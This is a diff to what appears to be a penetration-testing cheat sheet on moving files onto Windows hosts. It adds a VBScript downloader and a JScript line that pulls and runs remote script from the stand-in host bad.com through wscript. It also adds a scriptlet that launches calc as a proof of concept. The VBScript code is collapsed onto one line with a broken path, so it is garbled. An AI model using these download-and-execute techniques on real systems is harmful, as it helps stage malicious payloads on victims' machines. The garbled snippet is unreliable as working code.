@@ -64,7 +64,37 @@ wget http://ip-addr[:port]/file[-o output-file]
 
 #### A lesser known usage of wget is its ability to download FTP files as well. To do that, simply prepend a ftp:// before the URL. If the FTP server needs credentials, specify them with --ftp-user=username and --ftp-password=pass.
 
-## <mark style="color:red;">HTTP powershell from windows</mark>
+## <mark style="color:red;">Download with Visual basic</mark>
+
+```
+Set args = Wscript.Arguments Url = "http://domain/file" dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") dim bStrm: Set bStrm = createobject("Adodb.Stream") xHttp.Open "GET", Url, False xHttp.Send with bStrm     .type = 1 '     .open     .write xHttp.responseBody     .savetofile " C:%homepath%file", 2 ' end with
+
+# run with:
+cscript wget.vba
+```
+
+## <mark style="color:red;">Jscript Download</mark>
+
+```
+echo GetObject("script:https://bad.com/code.js") > code.js && wscript.exe code.js
+
+
+# jscript source:
+
+<?xml version="1.0"?>
+<package>
+<component id="PopCalc">
+<script language="JScript">
+    <![CDATA[
+    var r = new ActiveXObject("WScript.Shell").Run("calc"); 
+    ]]>
+</script>
+</component>
+</package>
+
+```
+
+## <mark style="color:red;">HTTP powershell Download</mark>
 
 #### oneliner command:
 
